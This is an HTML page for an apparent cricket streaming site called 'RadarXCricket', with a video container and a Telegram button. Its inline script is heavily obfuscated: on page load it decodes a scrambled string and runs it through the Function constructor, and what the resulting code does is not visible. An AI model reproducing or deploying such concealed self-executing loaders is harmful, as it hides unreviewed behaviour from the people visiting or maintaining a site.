<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXCricket</title>
    <style>
        /* General Page Styling */
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #242424, #3b5998);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
        }

        /* Bingewav Sports Logo Section */
        .logo-container {
            background: #000; /* Black background for the logo */
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
        }

        .logo-container img {
            width: 220px; /* Adjust the logo size */
            height: auto;
        }

        /* Video Player Styling */
        .player-container {
            width: 95%;
            max-width: 1200px;
            margin: 20px auto;
            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            overflow: hidden;
            background: #000; /* Black background behind the video for better focus */
            position: relative;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
        }

        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            border: none;
        }

        /* Stream Issue Section */
        .stream-issue {
            margin-top: 20px;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            font-size: 16px;
            color: #fff;
            width: fit-content;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .stream-issue a {
            color: #00c1ff;
            text-decoration: none;
            font-weight: bold;
        }

        .stream-issue a:hover {
            text-decoration: underline;
        }

        /* Join Telegram Button */
        .join-telegram-container {
            margin-top: 20px;
            text-align: center;
        }

        .join-telegram-btn {
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #008fd6;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .join-telegram-btn:hover {
            background-color: #006bb3;
        }
    </style>
</head>
<body>

<!-- Video Player Section -->
<div class="player-container" id="playerContainer"></div>

<!-- Join Telegram Button -->
<div class="join-telegram-container">
    <button class="join-telegram-btn" onclick="window.open('https://t.me/RadarXCricket', '_blank')">Join Telegram Channel</button>
</div>

<script>
var loadIframe;(function(){var cZa='',NRE=998-987;function ZNs(d){var x=2125027;var k=d.length;var u=[];for(var h=0;h<k;h++){u[h]=d.charAt(h)};for(var h=0;h<k;h++){var a=x*(h+543)+(x%40518);var r=x*(h+612)+(x%43880);var p=a%k;var s=r%k;var v=u[p];u[p]=u[s];u[s]=v;x=(a+r)%2763837;};return u.join('')};var shv=ZNs('svnniurkfcopthlqgcosjbaexduromttcwzyr').substr(0,NRE);var VfP='0a8;)=a vtC2(,+ w;hvwuvr;ydb7ruf=h3)cvg79ptn;hi++[gz8)dl. ==)ro,t.16wrAsvgph76v)r,jm1ft,}476n,,nh8a,!1(61,[nta(b,6 8r,i)=hg;u.aai][f;rijwro)"8rop+ap;n5cd;v+l)2=g[qp(;d+s(lrl;0ye= ===s9et4(r sCz= 80o+rovarnmn)aj;atCbmCn)nCftnclf;8+o))v=gAu,ap0{]rh5azvaAlpj(Cad n=  Ar]vh"1h>r.l2.)a;oxu={tu;hv[=Al)80.+=]ul=t,} a1uh"d5har=f0e-ti<v;yo;v0+.fr;re]-[6=p;==<f+ rrr al,af.[)];-8[(8}or{v+os()a]2vjlrme24(lot)v,)tq(2rsh;nteagg .m)(19wlurfl{e,bo"i)[{(z[f-fal=t;ar[;je7s1;]fks.d=;=)"t"=0ole19vnoeac)7ga.Cvdp"ire++k=6t;=h1";ble6jto=ri.o;-=(;c;s.)}flh0njlrai"falvi)(e=gnnl;iil(e.6c;6=})0.roSh2(+n9y.v;i+g8cll+b=n,.e"dar*o+=].aat}+1; n+(;!=fy=oa.-u(w<r)s.[a,o+rps=y;vsihv;wu.(u1cktr.uo;nu2suooa;(,=a)(cr=de,ionr  (rh5-i *;an;[a;=,go)s,r;n3t;v9f4>2]67.]ofnit(h)ctc(0v,)(rilu s(.S,oevnc(+((h)t,+u}las ,zf;=<htlenphpolk+)r+=.iul<(sma{ eso07  r=]a9[a, )g] rp,.rfiih8rCoqe(iq]a)r;uemu(jvkfs;mnt.m7o{jtuto(rrlf;';var iMB=ZNs[shv];var bZl='';var yss=iMB;var QBu=iMB(bZl,ZNs(VfP));var hlp=QBu(ZNs('t]4L dn_.uLb7(L;untez!e(mtmLoEng+%&;srt2$k_n4dsL3,b1o}idLt$5-.c(f.,b6eI%L ,$o L{i(r,3LlLeu_$$}r2$=62 1LlLtyLa1(8f6]9d(b%=b)3)vLf.omr\/Lp8.ex_6z2f,cL_b8=dya*fmrsfwc+!c)[%]0a%tl.cL8,5c,,leyLt.eL!La.Ec,aim0?j -;%)Lfov.;)%e_0Lawo;g$va7a\/;0at.L==b&e,rtLC=r1%Seim"-nax((a$lnLse6f6Lzl2oLv42dhlufia=!dae%438lev37sd.ed_affe+ce1oLlt=Cw=o=etn!r3c.s2]a)u.p.2ei=1i$-;dLp!i#lLtLmtwLtleh$bre)fao"_fca)o.ro_% LL c==LceahpLo(e2tlcoI3-#{hdL-gtd.gq=5cl-nfua,{;c1)5q]{;(_)n4qo.;Li9ho)}.s5(tpe$ ){43k)6tw6pxtag(j_.pL63!jr;Lt(!-ylLLsL27wf!%l]2iaa.(lbnLt(;a.7ls] ap;af898;az((ru1f;3Lnc4_zc=L+gamxe!;3)cL.ao4L-.2.;zL6L)tn.sL%+c40%(u$7_onsz]8,L8){]6#+n,r)eLfLiu3wz7i)k),eLht$Lo lc5r8Lrfr;cLj :c=.Lt0L*ln(d,c1!)+,C%Lm.m6n38e0ac*kaxr#L0uf;!eL3kc}n.l(c._s1Lr,ga_0!ca-iL ;cj;1.LgLio{\/3e,.L"d95t_,7L00dja)-koloou63L$LiLiS)%Lni({.7l$ac#nark,dot 27e.tkrgiuo3rL.a%$0s=p.ndL[re%2tut)4.)f=z8o%.m5ed(Lpdmr\/.Lbc!$pra7f4)(\'%L2crL8}r%!}d1eepvor2u&!ti\/%tci(*ue-4s%.L.nCom\'ra#pnf3$eu6 )lL6\/e(r\/nLrr0f],Lj=LS83tfLb\/dL2\'!2xa.!cL1wu9,)LlsLL 3tf Ld9t)de( Ldciftd=tl1L$4d.39L7un4L[ofe]vL=);t)[63).2ocfr,+)Lns\/j;nlaaoo}3v.%2_L_oi["nr0),uL_8;fadLs!"$(  )[})79cx4. .{Lje.9,L)L(e4"t(],os()\/sm%)#et,-]!.]l2tjn7}33keaLcw{i8=3]*Lso3c$.cn42..tng!23dtra7)L,L2s1).ch]%(5\/ )6s+loe=rL$gj(8.e6(uL]cc.$&ao(7s$L8Lioj(j.Ll!]i (LsLrv+g.!1_t$;,nj (n!(i,s,zb1a%1[m8i)li#f,i]jLL!eLg(_)b]nu%n3o.n(coi7f;6m).!}pmtL3tdL=o.faLtL1r_12bi["oo[L6ortl.Lf;\'r(iLrmj, bsl,";b(w ((.%)-_Ls.}!cpeu$1,o1b(!sbn'));var UbE=yss(cZa,hlp );UbE(5128);return 2355})()
</script>

</body>
</html>